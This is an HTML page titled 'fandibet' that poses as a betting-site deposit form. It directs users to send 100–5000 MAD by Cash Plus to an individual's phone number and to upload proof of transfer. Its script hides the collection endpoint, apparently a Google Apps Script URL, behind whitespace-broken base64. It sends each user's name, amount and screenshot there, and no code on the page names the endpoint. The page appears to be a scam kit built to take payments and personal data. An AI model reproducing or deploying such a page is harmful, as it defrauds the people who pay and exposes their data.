<!DOCTYPE html>  
<html lang="fr" dir="ltr">  
<head>  
  <meta charset="UTF-8" />  
  <title>fandibet</title>  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />  
  <style>  
    body {margin:0;background:#0b0c10;color:#fff;font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}  
    header {background:#1c1c1c;height:44px;display:flex;justify-content:center;align-items:center;}  
    .logo {font-size:15px;font-weight:500;display:flex;align-items:center;gap:6px;}  
    .logo svg {width:16px;height:16px;flex-shrink:0;}  

    .card {background:#ffffff;border-radius:0;width:90%;max-width:420px;margin:30px auto;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,0.25);}  
    .card-top {padding:20px 0;display:flex;align-items:center;justify-content:center;background:#ffffff;}  
    .card-top img {max-height:55px;max-width:85%;object-fit:contain;display:block;}  
    .card-bottom {background:#f7f7f7;padding:20px;color:#000;}  

    .warning-box {padding:15px 10px;text-align:left;}  
    .warning-box p {margin:6px 0;font-size:16px;font-weight:700;color:#ff0000;line-height:1.6;text-align:left;}  

    .payment-line{display:flex;align-items:center;gap:8px;margin:12px 0;}  
    .blue-text{font-size:14px;color:#001F54}  
    .blue-text strong{font-weight:600}  
    .normal-text{color:#001F54}  
    .copy-icon{display:flex;align-items:center;cursor:pointer;}  
    .copy-icon img{width:16px;height:16px;}  
    .copied-text{color:#000;font-size:13px;margin-left:4px;visibility:hidden;}  
    .copied-text.show{visibility:visible}  

    .info-block{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:18px;gap:10px}  
    .info-label{flex:0 0 55%;max-width:55%;text-align:left;color:#001F54;font-weight:500;font-size:14px;line-height:1.4}  
    .info-input{flex:0 0 45%;max-width:45%}  
    input[type=text]{width:100%;padding:10px;font-size:15px;border:none;border-top:1px solid #bbb;border-left:1px solid #bbb;border-radius:0;text-align:center;background:#fff;color:#000}  
    .english-numbers{direction:ltr;text-align:center;font-feature-settings:"lnum"}  

    input[type=text]:focus,input[type=file]:focus {outline:none;box-shadow:none;}  

    .upload-section{background:#ccc;width:70px;height:70px;display:flex;align-items:center;justify-content:center;border-radius:0}  
    .upload-section input[type=file]{display:none}  
    .upload-section label{font-size:30px;color:#fff;cursor:pointer;line-height:1}  
    .preview-image{width:70px;height:70px;object-fit:cover;border:1px solid #ccc;display:none;border-radius:0}  
    .note{font-size:12px;color:#666;margin-top:4px}  

    .submit-btn{background:#007bff;color:#fff;font-size:16px;padding:14px;border:none;border-radius:0;width:100%;cursor:pointer;transition:.3s ease;box-shadow:0 2px 6px rgba(0,0,0,0.2);display:flex;justify-content:center;align-items:center;gap:10px;}  
    .submit-btn:disabled{opacity:0.8;cursor:not-allowed;}  

    .loading-screen {position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center;z-index:9999;}  
    .loading-box {background:#fff;display:flex;align-items:center;justify-content:space-between;gap:18px;padding:16px 22px;min-width:250px;border-radius:0;box-shadow:0 3px 12px rgba(0,0,0,0.3);font-family:Roboto,Arial,sans-serif;}  
    .loading-text {font-size:15px;color:#444;}  
    .spinner {border:3px solid transparent;border-top:3px solid #0d99ff;border-right:3px solid #0d99ff;border-radius:50%;width:22px;height:22px;animation:spin 0.8s linear infinite;}  
    @keyframes spin {100%{transform:rotate(360deg);}}  

    @media (max-width:380px){  
      .card{width:95%;margin:20px auto;}  
      .card-top img{max-height:45px;}  
      .info-label{flex:0 0 50%;max-width:50%;font-size:13px;}  
      .info-input{flex:0 0 50%;max-width:50%;}  
      input[type=text]{font-size:14px;padding:8px;}  
      .payment-line{flex-wrap:wrap;font-size:13px;}  
      .blue-text{font-size:13px;}  
      .upload-section,.preview-image{width:60px;height:60px;}  
      .submit-btn{font-size:15px;padding:12px;}  
    }  
  </style>  
</head>  
<body>  
  <header>  
    <div class="logo">fandibet  
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none">  
        <circle cx="12" cy="12" r="10" fill="#1DA1F2"/>  
        <path d="M9.5 12.5l2 2 4-4" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>  
      </svg>  
    </div>  
  </header>  

  <form class="card" id="transferForm">  
    <div class="card-top">  
      <img src="https://i.postimg.cc/SNwP2gDX/lbankalik.png" alt="lbankalik.png">  
    </div>  

    <div class="card-bottom">  
      <div class="warning-box">  
        <p dir="ltr">تحذير: إذا كان المبلغ أقل من الحد الأدنى للإيداع، فلن يتم إضافة أموالك</p>  
        <p dir="ltr">Warning: If the amount is less than the minimum deposit limit, your funds will not be credited.</p>  
      </div>  

      <div class="payment-line">  
        <span class="blue-text"><strong>CASHPLUS AMINE</strong> <span class="normal-text">0767442227</span></span>  
        <span class="copy-icon" onclick="copyText(this,'0767442227')">  
          <img src="https://i.postimg.cc/ZnpNqgK3/file-000000001e9c620a954f9b15e02be3c1.png" alt="copy-icon">  
          <span class="copied-text">Copié</span>  
        </span>  
      </div>  

      <div class="payment-line">  
        <span class="blue-text"><strong>MOTIF</strong> <span class="normal-text">jawaher</span></span>  
        <span class="copy-icon" onclick="copyText(this,'jawaher')">  
          <img src="https://i.postimg.cc/ZnpNqgK3/file-000000001e9c620a954f9b15e02be3c1.png" alt="copy-icon">  
          <span class="copied-text">Copié</span>  
        </span>  
      </div>  

      <div class="info-block">  
        <div class="info-label">Montant (Min 100.00 MAD / Max 5000.00 MAD):</div>  
        <div class="info-input">  
          <input type="text" name="amount" id="amount" class="english-numbers" value="100.00">  
        </div>  
      </div>  

      <div class="info-block">  
        <div class="info-label">Nom complet (Cash Plus):</div>  
        <div class="info-input">  
          <input type="text" name="sender_name" id="sender_name">  
        </div>  
      </div>  

      <div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">  
        <div style="flex:0 0 55%;color:#001F54;font-size:14px;line-height:1.4">  
          <strong>Upload screenshot of successful transfer:</strong>  
          <div class="note">(.jpg, .jpeg, .png, .pdf, max 20 MB)</div>  
        </div>  
        <div style="flex:0 0 45%;display:flex;align-items:center;gap:10px">  
          <div class="upload-section">  
            <label for="proof">+</label>  
            <input type="file" id="proof" name="proof" accept=".jpg,.jpeg,.png,.pdf">  
          </div>  
          <img id="preview" class="preview-image" />  
        </div>  
      </div>  

      <button type="submit" class="submit-btn" id="submitBtn">Confirmer</button>  
    </div>  
  </form>  

  <div id="loadingScreen" class="loading-screen">  
    <div class="loading-box">  
      <span class="loading-text">Chargement...</span>  
      <div class="spinner"></div>  
    </div>  
  </div>  

  <input type="text" id="hiddenCopyInput" style="position:absolute;top:-9999px;left:-9999px;" readonly>  

  <script>  
    function copyText(el,val){  
      if(navigator.clipboard){  
        navigator.clipboard.writeText(val).then(()=>showCopied(el)).catch(()=>fallbackCopy(el,val))  
      }else fallbackCopy(el,val)  
    }  
    function fallbackCopy(el,val){  
      const i=document.getElementById('hiddenCopyInput');i.value=val;i.select();document.execCommand('copy');showCopied(el)  
    }  
    function showCopied(el){  
      const c=el.querySelector('.copied-text');  
      if(c){  
        c.classList.add('show');  
        setTimeout(()=>c.classList.remove('show'),1200)  
      }  
    }  

    document.getElementById('proof').addEventListener('change',e=>{  
      const f=e.target.files[0],p=document.getElementById('preview');  
      if(f&&f.type.startsWith('image/')){  
        const r=new FileReader();  
        r.onload=ev=>{p.src=ev.target.result;p.style.display='block'};  
        r.readAsDataURL(f)  
      }else{p.src='';p.style.display='none'}  
    });  

    document.getElementById("amount").addEventListener("input",function(){  
      this.value=this.value.replace(/[^0-9.]/g,"");  
    });  
    document.getElementById("sender_name").addEventListener("input",function(){  
      this.value=this.value.replace(/[^A-Za-z ]/g,"");  
    });  

    function getSecureURL(){  
      const encoded = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc y9BS2Z5Y2J5X3lQZ1hDQ0ZwdkdSU TREb2ExRk1mSFM0alhkNXk4cC0tZlBRQU ZuQURjRkk2S WN2ZlBwNVd0Wmp0MkdqcVh6b25lUS9leGVj";  
      return atob(encoded.replace(/\s/g,""));  
    }  

    const loadingScreen=document.getElementById("loadingScreen");  
    const submitBtn=document.getElementById("submitBtn");  

    document.getElementById("transferForm").addEventListener("submit",async e=>{  
      e.preventDefault();  
      const a=document.getElementById("amount").value.trim();  
      const n=document.getElementById("sender_name").value.trim();  
      const file=document.getElementById("proof").files[0];  

      if(!a || !n){  
        submitBtn.disabled=false;  
        submitBtn.innerHTML='Confirmer';  
        return;  
      }  

      submitBtn.disabled=true;  
      submitBtn.innerHTML = '<div class="spinner"></div>';  
      loadingScreen.style.display="flex";   
      try{  
        const r=new FileReader();  
        r.onloadend=async function(){  
          const b=r.result;  
          const res=await fetch(getSecureURL(),{  
            method:"POST",  
            headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},  
            body:new URLSearchParams({amount:a,fullname:n,imageBase64:b})  
          });  
          if(res.ok){  
            window.location.replace("vcp/");  
          }else{  
            submitBtn.disabled=false;  
            submitBtn.innerHTML = 'Confirmer';  
            loadingScreen.style.display="none";  
          }  
        };  
        if(file){r.readAsDataURL(file)} else {  
          submitBtn.disabled=false;  
          submitBtn.innerHTML = 'Confirmer';  
          loadingScreen.style.display="none";  
        }  
      }catch(err){  
        submitBtn.disabled=false;  
        submitBtn.innerHTML = 'Confirmer';  
        loadingScreen.style.display="none";  
      }  
    });  

    window.addEventListener("pageshow",function(){  
      loadingScreen.style.display="none";  
      submitBtn.disabled=false;  
      submitBtn.innerHTML='Confirmer';  
    });  
  </script>  
</body>  
</html>
